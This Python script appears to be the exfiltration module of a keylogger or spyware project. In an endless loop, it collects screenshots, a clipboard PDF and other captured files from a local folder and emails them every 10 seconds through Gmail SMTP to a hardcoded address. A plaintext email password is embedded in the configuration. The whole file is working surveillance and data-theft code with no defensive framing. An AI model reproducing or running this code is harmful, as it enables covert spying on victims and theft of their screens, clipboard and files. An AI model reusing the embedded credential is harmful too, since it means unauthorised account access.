import sys
import os
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from concurrent.futures import ThreadPoolExecutor

# Adding the KL directory to Python's system path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '.')))

from encrypt_and_decrypt import encrypt_files, decrypt_files

# Configurations
email_address = "test123.moali@gmail.com"
password = "bevnfpjwkmodnuln"
toaddr = "test123.moali@gmail.com"
clipboard_pdf_file = "D:\\Python\\D.Dor\\KL\\clipboard.pdf"  # Path to clipboard PDF
screenshot_folder = "D:\\Python\\D.Dor\\KL\\"  # Folder where screenshots are saved

# Function to send email with attachments
def send_email(subject, body, file_paths):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = toaddr
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    for file_path in file_paths:
        with open(file_path, 'rb') as f:
            mime_base = MIMEBase('application', 'octet-stream')
            mime_base.set_payload(f.read())
            encoders.encode_base64(mime_base)
            mime_base.add_header('Content-Disposition', f"attachment; filename={os.path.basename(file_path)}")
            msg.attach(mime_base)

    # Sending email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(email_address, password)
        server.sendmail(email_address, toaddr, msg.as_string())

# Function to get all screenshots from the folder
def get_screenshot_files():
    screenshot_files = []
    for file in os.listdir(screenshot_folder):
        if file.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp', '.gif')):
            screenshot_files.append(os.path.join(screenshot_folder, file))
    return screenshot_files

# Function to send screenshots email
def send_screenshots_email(screenshot_files):
    send_email("Screenshots", "Here are the screenshots.", screenshot_files)

# Function to send encrypted files and clipboard email
def send_encrypted_files_email(decrypted_files):
    file_paths = decrypted_files + [clipboard_pdf_file]
    send_email("Encrypted Files and Clipboard PDF", "Here are the encrypted files and clipboard PDF.", file_paths)

# Function to repeatedly send email every 10 seconds
def send_emails_periodically():
    with ThreadPoolExecutor(max_workers=2) as executor:
        while True:
            try:
                # Encrypt the files (if any) and then decrypt them
                encrypt_files()
                decrypted_files = decrypt_files()

                # Get all screenshot files
                screenshot_files = get_screenshot_files()

                # Submit tasks for concurrent email sending
                executor.submit(send_screenshots_email, screenshot_files)
                executor.submit(send_encrypted_files_email, decrypted_files)

                # Wait for 10 seconds before sending the next set of emails
                time.sleep(10)
            
            except Exception as e:
                print(f"Error occurred: {e}")
                time.sleep(10)  # Wait before retrying in case of error

# Main execution (start sending emails periodically)
if __name__ == "__main__":
    send_emails_periodically()
